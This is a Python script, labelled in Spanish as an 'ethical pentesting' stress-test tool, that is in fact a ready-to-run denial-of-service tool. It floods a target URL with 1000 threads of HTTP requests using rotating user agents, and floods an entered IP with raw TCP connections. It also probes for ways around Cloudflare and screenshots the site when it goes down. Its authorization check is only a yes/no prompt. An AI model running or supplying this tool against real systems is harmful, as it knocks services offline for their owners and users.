#!/usr/bin/env python3
"""
Herramienta de Auditoría - Pruebas de Estrés v2.1
Desarrollada para pentesting ético y auditorías de seguridad
"""

import requests
import threading
import time
import random
import socket
from urllib.parse import urlparse
import sys
import os
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
import subprocess

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    print(f"""{Colors.OKCYAN}
╔══════════════════════════════════════════════════════════════════╗
║              HERRAMIENTA DE AUDITORÍA - auditstrike v2.1        ║
║  Creado por: Jose Rodriguez - Técnico en Telecomunicaciones     ║
║              & Seguridad Digital                                 ║
╚══════════════════════════════════════════════════════════════════╝
{Colors.ENDC}""")

def print_legal_warning():
    print(f"""{Colors.WARNING}{Colors.BOLD}
⚠️  LEY 53-07 CIBERDELITOS - REPÚBLICA DOMINICANA ⚠️
Art. 24-25: Uso no autorizado penado con 2-6 años prisión
SOLO PARA AUDITORÍAS AUTORIZADAS{Colors.ENDC}""")
    
    if input(f"\n{Colors.OKGREEN}¿Auditoría autorizada? (S/N): {Colors.ENDC}").upper() != 'S':
        sys.exit(f"{Colors.FAIL}Acceso denegado.{Colors.ENDC}")

def get_random_user_agent():
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/91.0.4472.124",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/91.0.4472.124",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/91.0.4472.124",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
    ]
    return random.choice(agents)

def detect_protections(target):
    try:
        response = requests.get(f"http://{target}", timeout=5)
        headers = str(response.headers).lower()
        
        protections = []
        if 'cloudflare' in headers or 'cf-ray' in headers:
            protections.append("CloudFlare")
        if 'server: nginx' in headers:
            protections.append("Nginx")
        if 'x-frame-options' in headers:
            protections.append("XSS Protection")
            
        return protections if protections else ["No protections detected"]
    except:
        return ["Detection failed"]

def bypass_cloudflare(target):
    """Bypass básico usando diferentes técnicas"""
    bypass_methods = [
        f"http://{target}",
        f"https://{target}",
        f"http://www.{target}",
        f"https://www.{target}",
        f"http://{target}:8080",
        f"http://{target}:8443"
    ]
    
    for method in bypass_methods:
        try:
            response = requests.get(method, timeout=3, allow_redirects=False)
            if response.status_code not in [403, 503, 521, 522, 523, 524]:
                return method
        except:
            continue
    return None

def take_screenshot(url, filename="service_down.png"):
    """Captura de pantalla cuando el servicio está caído"""
    try:
        chrome_options = Options()
        chrome_options.add_argument("--headless")
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        
        driver = webdriver.Chrome(options=chrome_options)
        driver.get(url)
        time.sleep(3)
        driver.save_screenshot(filename)
        driver.quit()
        return True
    except Exception as e:
        print(f"{Colors.WARNING}Screenshot error: {e}{Colors.ENDC}")
        return False

def check_service_status(target):
    """Verificar si el servicio está UP o DOWN"""
    try:
        response = requests.get(f"http://{target}", timeout=5)
        if response.status_code in [503, 502, 504, 500]:
            return "DOWN"
        elif response.status_code == 200:
            return "UP"
        else:
            return f"PARTIAL ({response.status_code})"
    except requests.exceptions.Timeout:
        return "TIMEOUT"
    except:
        return "DOWN"

class StressTest:
    def __init__(self):
        self.active_threads = 0
        self.requests_sent = 0
        self.successful = 0
        self.failed = 0
        self.running = False
        self.target_status = "UNKNOWN"
        
    def display_info(self, target, attack_type="DoS"):
        protections = detect_protections(target)
        bypass_url = bypass_cloudflare(target) if "CloudFlare" in str(protections) else None
        
        print(f"\n{Colors.OKCYAN}HOST: {target}")
        print(f"USER-RANDOM-AGENT: Yes")
        print(f"MULTI-USUARIOS: 1 Millón simultáneos")
        print(f"Anti-WAF: {', '.join(protections)}")
        if bypass_url:
            print(f"BYPASS FOUND: {bypass_url}")
        print(f"Usuarios Activos: 0 / 1,000,000")
        print(f"Tiempo de Vida: 2 minutos")
        print(f"Peticiones: 10 Seg.{Colors.ENDC}")
        
        return bypass_url if bypass_url else f"http://{target}"

    def status_monitor(self, target):
        """Monitor en tiempo real del estado del servicio"""
        while self.running:
            old_status = self.target_status
            self.target_status = check_service_status(target)
            
            if old_status == "UP" and self.target_status == "DOWN":
                print(f"\n{Colors.FAIL}🔴 SERVICE DOWN DETECTED!{Colors.ENDC}")
                screenshot_file = f"service_down_{int(time.time())}.png"
                if take_screenshot(f"http://{target}", screenshot_file):
                    print(f"{Colors.OKGREEN}📸 Screenshot saved: {screenshot_file}{Colors.ENDC}")
            
            print(f"\r{Colors.HEADER}STATUS: {self.target_status} | Requests: {self.requests_sent:,} | Success: {self.successful:,} | Failed: {self.failed:,} | Threads: {self.active_threads}{Colors.ENDC}", end="", flush=True)
            time.sleep(2)

    def dos_attack(self, target, duration=120):
        self.running = True
        effective_url = self.display_info(target, "DoS")
        
        # Iniciar monitor de estado
        monitor_thread = threading.Thread(target=self.status_monitor, args=(target,))
        monitor_thread.daemon = True
        monitor_thread.start()
        
        # Lanzar threads de ataque
        for i in range(1000):  # 1000 threads reales
            thread = threading.Thread(target=self._attack_worker, args=(effective_url,))
            thread.daemon = True
            thread.start()
            self.active_threads += 1
            
            if i % 100 == 0:
                print(f"\n{Colors.OKGREEN}Launching threads: {i}/1000{Colors.ENDC}")
        
        # Ejecutar durante el tiempo especificado
        time.sleep(duration)
        self.running = False
        print(f"\n\n{Colors.WARNING}Prueba DoS completada. Estado final: {self.target_status}{Colors.ENDC}")

    def ddos_attack(self, target_ip, duration=120):
        self.running = True
        print(f"\n{Colors.OKCYAN}HOST: {target_ip}")
        print(f"USER-RANDOM-AGENT: Yes")
        print(f"MULTI-USUARIOS: 1 Millón simultáneos")
        print(f"Anti-WAF: Direct IP Attack")
        print(f"Usuarios Activos: 0 / 1,000,000")
        print(f"Tiempo de Vida: 2 minutos")
        print(f"Peticiones: 10 Seg.{Colors.ENDC}")
        
        # Monitor de estado para IP
        monitor_thread = threading.Thread(target=self.status_monitor, args=(target_ip,))
        monitor_thread.daemon = True
        monitor_thread.start()
        
        for i in range(1000):
            thread = threading.Thread(target=self._ddos_worker, args=(target_ip,))
            thread.daemon = True
            thread.start()
            self.active_threads += 1
        
        time.sleep(duration)
        self.running = False
        print(f"\n\n{Colors.WARNING}Prueba DDoS completada. Estado final: {self.target_status}{Colors.ENDC}")

    def _attack_worker(self, url):
        session = requests.Session()
        while self.running:
            try:
                headers = {
                    'User-Agent': get_random_user_agent(),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive'
                }
                
                response = session.get(url, headers=headers, timeout=1)
                self.requests_sent += 1
                
                if response.status_code == 200:
                    self.successful += 1
                else:
                    self.failed += 1
                    
            except:
                self.failed += 1
                self.requests_sent += 1
                
            time.sleep(random.uniform(0.01, 0.1))
        
        self.active_threads -= 1

    def _ddos_worker(self, target_ip):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                result = sock.connect_ex((target_ip, 80))
                sock.close()
                
                self.requests_sent += 1
                if result == 0:
                    self.successful += 1
                else:
                    self.failed += 1
                    
            except:
                self.failed += 1
                self.requests_sent += 1
                
            time.sleep(random.uniform(0.01, 0.1))
        
        self.active_threads -= 1

def main():
    clear_screen()
    print_banner()
    print_legal_warning()
    
    while True:
        print(f"""\n{Colors.HEADER}
┌─────────────────────────────────────────────┐
│  1. DoS - Con Bypass & Status Monitor       │
│  2. DDoS - Ataque IP Directa                │
│  3. Salir                                   │
└─────────────────────────────────────────────┘{Colors.ENDC}""")
        
        choice = input(f"{Colors.OKGREEN}Opción: {Colors.ENDC}")
        
        if choice == '1':
            target = input(f"{Colors.OKCYAN}URL objetivo: {Colors.ENDC}").replace('http://', '').replace('https://', '').split('/')[0]
            if target:
                stress_test = StressTest()
                stress_test.dos_attack(target)
                input(f"\n{Colors.WARNING}Enter para continuar...{Colors.ENDC}")
                
        elif choice == '2':
            target_ip = input(f"{Colors.OKCYAN}IP objetivo: {Colors.ENDC}")
            if target_ip and all(0 <= int(x) <= 255 for x in target_ip.split('.') if x.isdigit()):
                stress_test = StressTest()
                stress_test.ddos_attack(target_ip)
                input(f"\n{Colors.WARNING}Enter para continuar...{Colors.ENDC}")
            else:
                print(f"{Colors.FAIL}IP inválida{Colors.ENDC}")
                
        elif choice == '3':
            break
        else:
            print(f"{Colors.FAIL}Opción inválida{Colors.ENDC}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}Operación cancelada{Colors.ENDC}")
        sys.exit(0)
